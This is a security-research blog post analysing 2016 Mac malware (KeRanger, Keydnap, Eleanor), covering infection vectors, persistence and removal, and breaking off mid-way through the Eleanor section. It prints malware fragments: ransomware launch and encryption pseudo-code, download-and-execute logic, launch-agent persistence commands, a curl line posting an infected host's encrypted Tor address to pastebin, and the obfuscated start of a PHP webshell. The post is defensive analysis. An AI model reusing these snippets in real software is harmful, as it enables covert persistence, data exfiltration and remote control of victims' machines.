<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">

<head>
<title>Objective-See</title>

<meta property="og:title" content="Mac Malware of 2016" />
<meta property="og:type" content="website" />
<meta property="og:image" content="https://objective-see.com/images/blog/blog_0x16/CVE_2015-3715_0x2.png" />

<link rel="shortcut icon" href="../images/logoApple.ico">
<link rel="stylesheet" type="text/css" href="../css/style.css">
<link href="../css/ss-social.css" rel="stylesheet" />
<link href="../css/ss-standard.css" rel="stylesheet" />
<link href="../css/timeline.css" rel="stylesheet" />
<link href="../css/table.css" rel="stylesheet" />

<script src="../js/analytics.js"></script>
<script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
<script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />



<link href="https://objective-see.com/rss.xml" rel="alternate" type="application/rss+xml" title="Objective-See's Blog Feed" />

<meta http-equiv="Cache-Control" content="no-store" />

</head>

<body>
<nav role="main">
<ul>
	<li><a href="../index.html" class="menubutton logo">Objective See</a></li>
	<li><a href="../about.html" class="menubutton about">about</a></li>
	<li><a href="../blog.html" class="menubutton blog visited">blog</a></li>
	<li><a href="../malware.html" class="menubutton malware">malware</a></li>
	<li><a href="../products.html" class="menubutton products">products</a></li>
</ul>
</nav>

<div class="pageContent">
	<hr class="gradient">
	<br>
	<section class="blogContent">
		<div class="blogTitle">Mac Malware of 2016</div>
		<div class="blogSubTitle">&rsaquo; a cumulative analysis of new OS X malware</div>
		<div class="blogDate">1/1/2017</div>
		
		<br>
		<span style="color: #95c02d; font-weight: bold;">Introduction</span><br>
		Due to sheer volume, Windows malware generally dominates the malicious code and news scene. Of course, Macs are susceptible to malware as well and 2016 saw a handful of new malware targeting Apple computers.
		<br>
		<br>
		In this blog, I wanted to discuss all Mac malware that appeared this year. While each sample has been reported on before (i.e. by the AV company that discovered it), this blog aims to cumulatively cover all in one place.  Moreover, for each, we'll identify the infection vector, persistence mechanism, features/goals, and describe disinfection. 
		<br>
		<br>
		If you want to play along, all samples can be downloaded from Objective-See's malware <a class="inlineLink" href="https://objective-see.com/malware.html">page</a>.
		<br>
		<br>
		<div style="border: 1px solid #FF6666; padding: 10px; margin-top:15px;">
		<span style="font-size: 14px;">By downloading the samples, you waive all rights to claim punitive, incidental and consequential damages resulting from mishandling or self-infection ;)
		<br><br>
		Also, the 'disinfection' instructions provided in this blog are specific to each malware specimen. Often malware can install other malware, or allow an remote attacker to do what ever they want. Thus if you were/are infected by any of these samples, it's suggested you fully <a class="inlineLink" href="https://support.apple.com/en-us/HT204904 ">re-install OS X</a>.
		</span>
		</div>
		<br>
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px;">
		<span style="font-size: 14px;">I'm presenting a talk at RSA 2017 titled <a class="inlineLink" href="https://www.rsaconference.com/events/us17/agenda/sessions/6105-meet-and-greet-with-the-macos-malware-class-of">"Meet and Greet with the macOS Malware Class of 2016</a>" In this talk I'll dive into the details of each of the malware specimens described here. In other words, think of this blog as a preview of my talk! 
		<br>
		<br>
		Hope to see you at RSA :)
		</span>
		</div>
		<br>
		<br>
		<span style="color: #95c02d; font-weight: bold;">Timeline</span><br>
    	<ul class="timeline">
        <li>
          <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x16/keRanger.png" width="32" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title">KeRanger</h4>
              <p><small class="text-muted">3/2016</small></p>
            </div>
            <div class="timeline-body">
              <p>The first fully-functional, in-the-wild ransomware for OS X.</p>
            </div>
          </div>
        </li>

        <li class="timeline-inverted">
        <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x16/eleanor.png" width="38" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title">Eleanor</h4>
              <p><small class="text-muted">7/2016</small></p>
            </div>
            <div class="timeline-body">
              <p>A PHP-based backdoor that exposed infected computers as a hidden Tor service.
			</p>
            </div>
          </div>
        </li>

        <li>
          <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x16/keydnap.png" width="32" style="padding-top: 10px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title">Keydnap</h4>
              <p><small class="text-muted">7/2016</small></p>
            </div>
            <div class="timeline-body">
              <p>A standard backdoor for OS X with a propensity for stealing credentials, and used Tor for its communications.</p>
            </div>
          </div>
        </li>
       
       	<li class="timeline-inverted">
        <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x16/fakeFileOpener.png" width="32" style="padding-top: 8px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title">Fake File Opener</h4>
              <p><small class="text-muted">8/2016</small></p>
            </div>
            <div class="timeline-body">
              <p>A rather annoying piece of adware, though it did have a unique persistence mechanism.
			</p>
            </div>
          </div>
        </li>

        <li>
          <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x16/mokes.png" width="32" style="padding-top: 10px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title">Mokes</h4>
              <p><small class="text-muted">9/2016</small></p>
            </div>
            <div class="timeline-body">
              <p>A fairly standard OS X backdoor, that did support a wide range of features.</p>
            </div>
          </div>
        </li>

        <li class="timeline-inverted">
        <div class="timeline-badge info">
          <i class="glyphicon">
          	<img src="../images/blog/blog_0x16/komplex.png" width="32" style="padding-top: 12px;"/>
          </i>
          </div>
          <div class="timeline-panel">
            <div class="timeline-heading">
              <h4 class="timeline-title">Komplex</h4>
              <p><small class="text-muted">9/2016</small></p>
            </div>
            <div class="timeline-body">
              <p>A Russian (APT 28/FancyBear) OS X implant, that provided remote 'administrative' capabilities.
			</p>
            </div>
          </div>
        </li>

    </ul>

    <br>
 	<span style="color: #95c02d; font-weight: bold;">KeRanger</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x16/keRanger.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 12px;">
	  KeRanger
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found on:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">3/2016</td>
	</tr>
	<tr style="border:none;">
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found by:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">PaloAlto Networks (<a class="inlineLink" href="http://researchcenter.paloaltonetworks.com/2016/03/new-os-x-ransomware-keranger-infected-transmission-bittorrent-client-installer/">report</a>)
	  </td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection vector:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">infected application on developer's official website</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">encrypt user files for ransom</td>
	</tr>
	<tr>
	  <td style="border:none;"><b>disinfection:</b></td>
	  <td style="border:none;">reboot</td>
	</tr>
	</tbody>
	</table>
  	OSX/KeRanger is the first fully-functional, in-the-wild ransomware for OS X!
  	<br>
  	<br>
  	<b>&rsaquo;</b> infection vector
  	<br>
  	This malware was unusual for a variety of reasons. First, its infection vector is somewhat (for Mac Malware) unique. In order to surreptitiously infect Mac users, the OSX/KeRanger authors hacked the official <a class="inlineLink" href="https://transmissionbt.com/">website</a> for a popular OS X bittorrent application, 'Transmission'
  	<br><br>
		<span><img src="../images/blog/blog_0x16/transmission.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	With access to the website, the malware authors then infected the legitimate Transmission application with OSX/KeRanger. Specifically, they added a new mach-O binary to application bundle (<span class="n3rdFont">General.rtf</span>).
	<br><br>
		<span><img src="../images/blog/blog_0x16/keRangerBinary.png" width="700" style="display:block; margin:auto;"/></span>
	<br>
	The main function of the <span class="n3rdFont">Transmission.app</span> was modified to execute this malware's binary:
	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
		<span class="n3rdFont">
		<span style="color: #006600;">//build path to source (General.rtf)</span><br>
		__sprintf_chk(pathSrc, 0x0, 0x400, "%s/Resources/General.rtf", ...);<br>
		<br>
		<span style="color: #006600;">//build path to destination (kernel_service)</span><br>
		__sprintf_chk(pathDest, 0x0, 0x400, "%s/Library/kernel_service", ...);<br>
		<br>
		<span style="color: #006600;">//read in source file</span><br>
		rbx = fopen(pathSrc, "rb");<br>
		var_1448 = fread(r12, 0x1, r13, rbx);<br>
		fclose(rbx);<br>
		<br>
		<span style="color: #006600;">//write it out to destination</span><br>
		r14 = fopen(pathDest, "wb+");<br>
		fwrite(r12, var_1448, 0x1, r14);<br>
		fclose(r14);<br>
		<br>
		<span style="color: #006600;">//set it to executable</span><br>
		chmod(pathDest, 0x40); <br>
		<br>
		<span style="color: #006600;">//launch it!</span><br>
		system(pathDest);
		<br>
		</span>
	</div>
	<br>
	Finally the malware authors re-signed the (now) infected application so that GateKeeper (in its default settings) would not prevent the malware from executing:
	<br><br>
		<span><img src="../images/blog/blog_0x16/keRangerSigned.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	Thus, any time an unsuspecting user downloaded and executed the Transmission application (again, from the official Transmission website) the malware would compromise their Mac. Yikes!
	<br>
  	<br>
  	<b>&rsaquo;</b> persistence
  	<br>
  	As far as I know, OSX/KeRanger does not contain any logic nor code to persist itself. Thus if the user reboots their system, or kills the malware's process, <span class="n3rdFont">kernel_service</span>, the malware will not be restarted...unless the user re-runs the infected Transmission application.
	<br>
	<br>
	<b>&rsaquo;</b> features
  	<br>
  	Another unique aspect of OSX/KeRanger was its payload or goal. In short it attempted to encrypt for ransom, user files. Yes, OSX/KeRanger was the first, fully-functional in-the-wild piece of ransomware targeting Apple computers. 
  	<br><br>
	Reversing the malware reveals its ransomware logic:
	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
		<span class="n3rdFont">
		<span style="color: #006600;">//encrypt /Users</span><br>
		recursive_task("/Users", _encrypt_entry, _putReadme);<br>
		<br>
		<span style="color: #006600;">//encrypt /Volumes</span><br>
		recursive_task("/Volumes", _check_ext_encrypt, _putReadme);<br>
		<br>
		<span style="color: #006600;">//build path to '.kernel_complete'</span><br>
		sprintf_chk(0x0, 0x0, 0x400, "%s/Library/.kernel_complete"...);<br>
		<br>
		<span style="color: #006600;">//write to file</span><br>
		rbx = fopen(0x0, "w");
		fwrite("do not touch this\n", 0x12, 0x1, rbx);
		<br>
		</span>
	</div>
	<br>
	As shown in the pseudo-code snippet, OSX/KeRanger will encrypt all files under <span class="n3rdFont">/Users/*</span> as well as all files under <span class="n3rdFont">/Volumes</span> that match certain extensions (PaloAlto Network's report noted about 300, including .docs, .jpgs, .zips, .cpp, etc). 
	<br><br>
	For each directory where the ransomware encrypts files, it creates a plaintext 'read-me' file the contains instructions to the user how to pay the ransom in order to recover their files:
	<br><br>
		<span><img src="../images/blog/blog_0x16/keRangerReadMe.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	One final, interesting aspect of OSX/KeRanger is that some researchers have convincingly claimed it is a rewrite or Mac version of the 'linux.encoder' ransomware. Their <a class="inlineLink" href="https://labs.bitdefender.com/2016/03/keranger-is-actually-a-rewrite-of-linux-encoder/">reasoning</a> is quite compelling and seems to confirm that oftentimes malware authors are quite keen on expanding their potential targets by porting the malicious creations to OS X. 
	<br>
	<br>
	<b>&rsaquo;</b> disinfection
	<br>
	Since (AFAIK) OSX/KeRanger does not persist, it is trivial to remove:
	<ol>
	<li>kill the <span class="n3rdFont">kernel_service</span> process</li>
	<li>remove <span class="n3rdFont">~/Library/kernel_*</span></li>
	<li>upgrade to version 2.93+ of <span class="n3rdFont">Transmission.app </span></li>
	</ol>
	It should be noted that currently Mac users should be protected anyways, as Apple revoked the signing certificate (<span class="n3rdFont">ID Z7276PX673</span>), as well as updated their XProtect signatures:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ cat /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.plist<br>
	&lt;dict&gt;<br>
    &lt;key&gt;Description&lt;/key&gt;<br>
    &lt;string&gt;OSX.KeRanger.A&lt;/string&gt;<br>
    &lt;key&gt;LaunchServices&lt;/key&gt;<br>
    &lt;dict&gt;<br>
    &nbsp;&nbsp;&nbsp;&lt;key&gt;LSItemContentType&lt;/key&gt;<br>
    &nbsp;&nbsp;&nbsp;&lt;string&gt;com.apple.application-bundle&lt;/string&gt;<br>
    &lt;/dict&gt;<br>
    &lt;key&gt;Matches&lt;/key&gt;<br>
    &lt;array&gt;<br>
    &nbsp;&nbsp;&nbsp;&lt;dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;MatchFile&lt;/key&gt;<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;dict&gt;<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;NSURLTypeIdentifierKey&lt;/key&gt;<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;public.unix-executable&lt;/string&gt;<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/dict&gt;<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;Pattern&lt;/key&gt;<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;488DBDD0EFFFFFBE00000000BA0004000031C04989D8*31F6   <br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4C89E7*83F8FF7457C785C4EBFFFF00000000&lt;/string&gt;	<br>
    <br>
    &nbsp;&nbsp;&nbsp;...
    <br>
    <br>
	</span>
	</div>
 	<br>
 	<br>

	<span style="color: #95c02d; font-weight: bold;">Keydnap</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x16/keydnap.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 12px;">
	  Keydnap
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found on:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">7/2016</td>
	</tr>
	<tr style="border:none;">
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found by:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">ESET (<a class="inlineLink" href="http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/">report</a>)
	  </td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection vector:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">infected application on developer's official website</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">backdoor &amp; credential stealer</td>
	</tr>
	<tr>
	  <td style="border:none;"><b>disinfection:</b></td>
	  <td style="border:none;">remove launch agents</td>
	</tr>
	</tbody>
	</table>
	OSX/Keynap is fairly standard backdoor for OS X with a propensity for stealing credentials, and uses Tor for its communications.
	<br>
  	<br>
  	<b>&rsaquo;</b> infection vector
  	<br>
  	The original infection vector for OSX/Keynap was never discovered. Eset states that,  <i>"It is still not clear how victims are initially exposed to OSX/Keydnap. It could be through attachments in spam messages, downloads from untrusted websites..."</i>
  	<br>
  	<br>
  	What is known is that it was distributed in a zip archive which contained a binary named <span class="n3rdFont">screenshot.jpg </span>. Since the filename contained a space at its end (i.e. <span class="n3rdFont">".jpg "</span>) when a user double-clicked it, it would be executed by <span class="n3rdFont">Terminal.app</span>. In other words, the malware would be run.
  	<br><br>
		<span><img src="../images/blog/blog_0x16/keydnapInfection.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	Later, it was discovered that the official Transmission website (<span class="n3rdFont">transmissionbt.com</span>), was hacked again 🙄 ...this time, to distribute Keydnap. Just as they had with OSX/KeRanger, the malware authors infected the legitimate Transmission application, by adding an extra binary (<span class="n3rdFont">License.rtf</span>) then modifying the application's code to execute it. The infected Transmission application was then (re)signed, with another stolen or fraudulently obtained Apple developer ID: <span class="n3rdFont">Shaderkin Igor (836QJ8VMCQ)</span>:
	<br><br>
		<span><img src="../images/blog/blog_0x16/keydnapSigned.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	Thus for a time, any user that downloaded and ran <span class="n3rdFont">Transmission.app</span> would be infected with OSX/Keydnap.
	<br>
  	<br>
  	<b>&rsaquo;</b> persistence
  	<br>
  	In order to persist, OSX/Keydnap creates two launch agents, <span class="n3rdFont">com.apple.iCloud.sync.daemon</span> and <span class="n3rdFont">com.geticloud.icloud.photo</span>:
	<br><br>
		<span><img src="../images/blog/blog_0x16/keydnapLaunchAgents.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	The first launch agent plist (<span class="n3rdFont">com.apple.iCloud.sync.daemon</span>) tells the OS to execute a binary named <span class="n3rdFont">icloudsyncd</span>. This binary is the backdoor component of the malware.
	<br>
	<br>
	The second launch agent plist (<span class="n3rdFont">com.geticloud.icloud.photo</span>) contains a path to the malware's command and control mechanisms. Named <span class="n3rdFont">icloudproc</span>, this binary is simply a copy of Tor2Web proxy.
	<br>
  	<br>
  	<b>&rsaquo;</b> features
  	<br>
  	As mentioned, <span class="n3rdFont">icloudsyncd</span> is the main component of the malware. It provides 'standard' backdoor or remote 'administrative' capabilities such ability to download and execute a file, including a python scripts:
  	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
	<span class="n3rdFont">
	<span style="color: #006600;">//exec downloaded python</span><br>
	sprintf(var_430, "/tmp/%s", rbx);<br>
	sprintf(var_830, "python %s", var_430);<br>
	<br>
	chmod(var_430, 0x1c0);<br>
	system(var_830);<br>
	</span>
	</div>
 	<br>
 	OSX/Keydnap also contains logic to elevate its privileges, albeit in very unsophisticated method; just asking: 
 	<br><br>
		<span><img src="../images/blog/blog_0x16/keydnapAuth.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	Perhaps the most interesting feature of the malware, is its ability to dump credentials and other sensitive information from the keychain. It does this via code from the open-source <a class="inlineLink" href="https://github.com/juuso/keychaindump">keychaindump</a> project. (note however, AFAIK, this would generate an <i>"icloudsyncd wants to access the keychain"</i> alert that the user would have to allow):
	<br>
		<span><img src="../images/blog/blog_0x16/keydnapKeychain.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	OSX/Keydnap uses a Tor2Web proxy for command and control. An installed launch agent, <span class="n3rdFont">icloudproc</span>, is automatically started by the OS, and listens on <span class="n3rdFont">127.0.0.1:9050</span>. As noted by ESET, the main backdoor component (<span class="n3rdFont">icloudsyncd</span>) uses this proxy for communication purposes: <i>"Keydnap is using the onion.to Tor2Web proxy over HTTPS to report back to its C&amp;C server."</i>
	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
	<span class="n3rdFont">
	lea        rdx, qword [0x10000bbe7] ; <span style="color: #006600;">"127.0.0.1:9050"</span><br>
	mov        esi, 0x2714  <br>
	xor        eax, eax<br>
	mov        rdi, rbx    <br> 
	call       curl_easy_setopt<br>
	</span>
	</div>
	<br>
	<br>
	<b>&rsaquo;</b> disinfection
	<br>
	OSX/Keydnap can be removed from an infected system, via the following steps:
	<ol>
	<li>Via the <span class="n3rdFont">'launchctl unload'</span> command, unload the backdoor and Tor proxy</li>
	<li>Remove the launch agent plist files <span class="n3rdFont">/Library/LaunchAgents</span> or <span class="n3rdFont">~/Library/LaunchAgents</span> <span class="n3rdFont">com.apple.iCloud.sync.daemon.plist</span> and <span class="n3rdFont">com.geticloud.icloud.photo.plist</span></li>
	<li>Remove the launch agent binaries &amp; files: <br>
	a) <span class="n3rdFont">~/Library/Application Support/com.apple.iCloud.sync.daemon/ </span><br>
	b) <span class="n3rdFont">~/Library/Application Support/com.geticloud/ </span>
	</ol>
	Apple has also revoked the Apple developer ID that was used to sign the infected Transmission application:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ spctl -a -t exec -vv Transmission.app<br>
	/Volumes/Transmission/Transmission.app: CSSMERR_TP_CERT_REVOKED<br>
	</span>
	</div>
	<br>
	<br>
	<span style="color: #95c02d; font-weight: bold;">Eleanor</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x16/eleanor.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 8px;">
	  Eleanor
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found on:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">7/2016</td>
	</tr>
	<tr style="border:none;">
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found by:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">BitDefender (<a class="inlineLink" href="https://labs.bitdefender.com/2016/07/new-mac-backdoor-nukes-os-x-systems/">report</a>)
	  </td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection vector:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">fake (trojaned) application</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">backdoor (php) with audio &amp; video capture capabilities</td>
	</tr>
	<tr>
	  <td style="border:none;"><b>disinfection:</b></td>
	  <td style="border:none;">remove launch agent</td>
	</tr>
	</tbody>
	</table>
	OSX/Eleanor is another basic, albeit 'feature-complete' backdoor (php) for Mac computers.
	<br>
  	<br>
  	<b>&rsaquo;</b> infection vector
  	<br>
  	Similar to other OS X malware of 2016, OSX/Eleanor was distributed in an applications via the internet. However, it appears that the malware authors simple (re)created an abandoned application ("EasyDoc Convertor"), as opposed to hacking the official website of a legitimate application. 
  	<br><br>
		<span><img src="../images/blog/blog_0x16/eleanorApp.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	The malicious, fake EasyDoc Convertor application was hosted on the popular app sharing website <a class="inlineLink" href="https://www.macupdate.com/">Mac Update</a>. Thus, any user that downloaded and ran this application would be infected with Eleanor. 
	<br>
  	<br>
  	<b>&rsaquo;</b> persistence
  	<br>
  	OSX/Eleanor installs three(!) launch agents in order to persist its various components. Obviously stealth was not something the malware authors cared about at all :P The three launch agents are: 
  	<ol>
  	<li><span class="n3rdFont">com.getdropbox.dropbox.integritycheck.plist</span> &rarr; <span class="n3rdFont">conn</span></li>
  	<li><span class="n3rdFont">com.getdropbox.dropbox.timegrabber.plist</span> &rarr; <span class="n3rdFont">check_hostname</span></li>
  	<li><span class="n3rdFont">com.getdropbox.dropbox.usercontent.plist</span> &rarr; <span class="n3rdFont">dbd</span></li>
  	</ol>
  	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	mv $DIR/com.getdropbox.dropbox.usercontent.plist ~/Library/LaunchAgents/com.getdropbox.dropbox.usercontent.plist
	<br><br>
	launchctl load ~/Library/LaunchAgents/com.getdropbox.dropbox.usercontent.plist<br>
	<br>
	mv $DIR/com.getdropbox.dropbox.integritycheck.plist ~/Library/LaunchAgents/com.getdropbox.dropbox.integritycheck.plist
	<br><br>
	launchctl load ~/Library/LaunchAgents/com.getdropbox.dropbox.integritycheck.plist<br>
	<br>
	mv $DIR/com.getdropbox.dropbox.timegrabber.plist ~/Library/LaunchAgents/com.getdropbox.dropbox.timegrabber.plist
	<br><br>
	launchctl load ~/Library/LaunchAgents/com.getdropbox.dropbox.timegrabber.plist
    <br>
	</span>
	</div>
	<br>
	<br>
  	The first launch agent, <span class="n3rdFont">com.getdropbox.dropbox.integritycheck.plist</span>, executes a binary name <span class="n3rdFont">conn</span>. This simply sets up a hidden Tor service. The second launch agent, <span class="n3rdFont">com.getdropbox.dropbox.timegrabber.plist</span> executes a bash script name <span class="n3rdFont">check_hostname</span>. This script publishes name of the hidden Tor service to pastebin. The final launch agent,<span class="n3rdFont">com.getdropbox.dropbox.usercontent.plist</span> executes a binary named <span class="n3rdFont">dbd</span>, which is actually a copy of Apple's PHP binary:
  	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ codesign -dvv ~/Library/.dropbox/dbd<br>
	...<br>
	Identifier=com.apple.php<br>
	Authority=Software Signing<br>
	Authority=Apple Code Signing Certification Authority<br>
	Authority=Apple Root CA<br>
	</span>
	</div>
	<br>
  	<br>
  	<b>&rsaquo;</b> features
  	<br>
  	A rather unique feature of Eleanor is that it essentially turns an infected host into a remotely accessible hidden Tor service. The command and control logic for this is implemented with the <span class="n3rdFont">conn</span> binary. Via Objective-See's <a class="inlineLink" href="https://objective-see.com/products/taskexplorer.html">TaskExplorer</a> utility, it is easy to the malware listening on both port 9060 and 9061:
  	<br><br>
		<span><img src="../images/blog/blog_0x16/eleanorTor.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	The malware gets these port values from one of its Tor configuration files, <span class="n3rdFont">~/Library/.dropbox/sync/storage</span>:
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ cat sync/storage<br>
	GeoIPFile /Users/user/Library/.dropbox/sync/data/list<br>
	GeoIPv6File /Users/user/Library/.dropbox/sync/data/list6<br>
	<br>
	HiddenServiceDir /Users/user/Library/.dropbox/sync/hs<br>
	HiddenServicePort 80 127.0.0.1:9991<br>
	HiddenServicePort 22 127.0.0.1:9992<br>
	<br>
	SOCKSPort 9060<br>
	ControlPort 9061<br>
	</span>
	</div>
	<br>
	The malware also contains a bash script named <span class="n3rdFont">check_hostname</span>, which, as previously mentioned, is persisted as a launch agent. The purpose of this script is to encrypt the name (address) of the hidden Tor service that was setup by the first launch agent, and then publish that to <a class="inlineLink" href="http://pastebin.com/">pastebin</a>. This of course allows the attacker to 'find' and connect to the infected host.
	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
	<span class="n3rdFont">
	<span style="color: #006600;">encrypt tor name ('hostname')<br>
	e.g. 'xjd6uzkuyonxzrz2.onion' </span><br>
	HOSTNAME=$(cat /Users/$USER/Library/.dropbox/sync/hs/hostname | cut -d '.' -f 1 | openssl rsautl -encrypt -pubin -inkey /Users/$USER/Library/.dropbox/public.key | openssl enc -base64 | sed "s/\+/PLUS/g")
	<br><br>
	<span style="color: #006600;">post to pastebin
	<br>pastebin.com/api/api_post.php
	</span><br>
	PASTEID=$(curl -sd "api_paste_code=$HOSTNAME&amp;api_option=paste&amp;api_dev_key=d1e52e9d2452e1810279527aa1a83c8b<br>&amp;api_paste_private=1&amp;api_user_key=df8a73a0813c422465564c913e760d87" "http://pastebin.com/api/api_post.php" | cut -d "/" -f 4)
	</span>
	</div>
	<br>
	The core backdoor logic of OSX/Eleanor, is actually implemented in PHP - this is why the malware has a copy of Apple's PHP binary. Specifically the malware contains a copy of the b374k shell (v 3.2.3) which is available online at <a class="inlineLink" href="https://github.com/b374k">github.com/b374k</a>.
	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
	<span class="n3rdFont">
	&lt;?php<br>
	<span style="color: #006600;">
	/*<br>
    &nbsp;&nbsp;b374k shell 3.2.3<br>
    &nbsp;&nbsp;Jayalah Indonesiaku<br>
    &nbsp;&nbsp;https://github.com/b374k/b374k<br>
	*/<br>
	</span>
	$GLOBALS['pass'] = "15bd408e435dc1a1509911cfd8c312f46ed54226";<br>
	$func="cr"."eat"."e_fun"."cti"."on";$b374k=$func('$ ...<br>
	</span>
	</div>
	<br>
	The PHP shell affords the attacker complete over an infected remote computer:
	<br><br>
